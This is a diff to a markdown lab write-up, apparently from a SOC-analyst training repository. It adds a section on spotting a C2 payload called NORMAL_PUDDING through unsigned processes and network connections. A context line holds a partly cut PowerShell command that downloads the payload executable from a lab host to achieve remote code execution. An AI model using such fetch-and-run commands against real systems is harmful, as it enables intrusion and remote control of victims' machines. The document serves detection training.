@@ -29,6 +29,14 @@ IWR -Uri http://192.168.159.100/NORMAL_PUDDING.exe -Outfile C:\Users\hoang\Downl
 - Perform RCE
 ![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/6335a1a3-c0a5-4ee5-aa38-a7144931a26d)
 
+## Observe and analyse 
+- As we can see here, the C2 payload is malicious processes, so they are not signed and they are active on network
+![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/f34352b8-d9c6-4f33-a0d8-13837a7796bf)
+- In the network tab, we can see the C2 payload NORMAL_PUDDING is established
+![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/e07f3d9a-3a6d-4aa1-aa01-064be6df2920)
+
+
+
 
 
 
